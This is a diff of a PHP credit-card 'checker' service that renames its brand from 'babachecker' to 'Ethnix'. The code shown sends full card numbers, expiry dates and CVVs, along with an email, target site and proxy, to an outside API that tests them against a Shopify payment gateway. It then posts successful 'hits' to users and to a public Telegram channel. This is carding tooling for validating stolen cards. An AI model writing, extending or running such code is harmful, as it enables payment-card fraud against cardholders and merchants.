@@ -33,7 +33,7 @@ $userStatus = strtoupper($userData['status'] ?? 'FREE');
 $userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
 $currentCredits = (int)$userData['credits'];
 if ($userStatus === 'BANNED') {
-    echo json_encode(['Response' => 'You are banned from using babachecker.']);
+    echo json_encode(['Response' => 'You are banned from using Ethnix.']);
     exit;
 }
 if ($currentCredits < 2) {
@@ -244,7 +244,7 @@ $level = $binInfo['level'];
 $issuer = $binInfo['issuer'];
 $country_info = $binInfo['country_info'];
 curl_close($chBin);
-$requestUrl = "https://babachecker.com/api/autog.php?cc={$cc}|{$month}|{$year}|{$cvv}&email={$email}&site={$site}&proxy={$proxy}";
+$requestUrl = "https://ethnix.net/api/autog.php?cc={$cc}|{$month}|{$year}|{$cvv}&email={$email}&site={$site}&proxy={$proxy}";
 
 $req = curl_init();
 curl_setopt_array($req, [
@@ -342,7 +342,7 @@ if (
         "[?] <b>Country ?</b> {$country_info}\n" .
         "???????????\n" .
         "[?] <b>Checked By ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[?] <b>Dev ?</b> babachecker";
+        "[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -357,7 +357,7 @@ if (
         "<b>Response ?</b> {$err}\n" .
         "<b>Gateway ?</b> Auto Shopify GraphQL\n" .
         "????????\n" .
-        "<b>Hit From:</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+        "<b>Hit From:</b> <a href=\"https://ethnix.net\">Ethnix</a>";
 
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     $result = json_encode([
@@ -409,7 +409,7 @@ if (
         "[?] <b>Country ?</b> {$country_info}\n" .
         "???????????\n" .
         "[?] <b>Checked By ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[?] <b>Dev ?</b> babachecker";
+        "[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -465,7 +465,7 @@ if (
         "[?] <b>Country ?</b> {$country_info}\n" .
         "???????????\n" .
         "[?] <b>Checked By ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[?] <b>Dev ?</b> babachecker";
+        "[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -520,7 +520,7 @@ if (
         "[?] <b>Country ?</b> {$country_info}\n" .
         "???????????\n" .
         "[?] <b>Checked By ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[?] <b>Dev ?</b> babachecker";
+        "[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
@@ -575,7 +575,7 @@ if (
         "[?] <b>Country ?</b> {$country_info}\n" .
         "???????????\n" .
         "[?] <b>Checked By ?</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
-        "[?] <b>Dev ?</b> babachecker";
+        "[?] <b>Dev ?</b> Ethnix";
     if (!empty($telegramId)) {
         $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
         error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
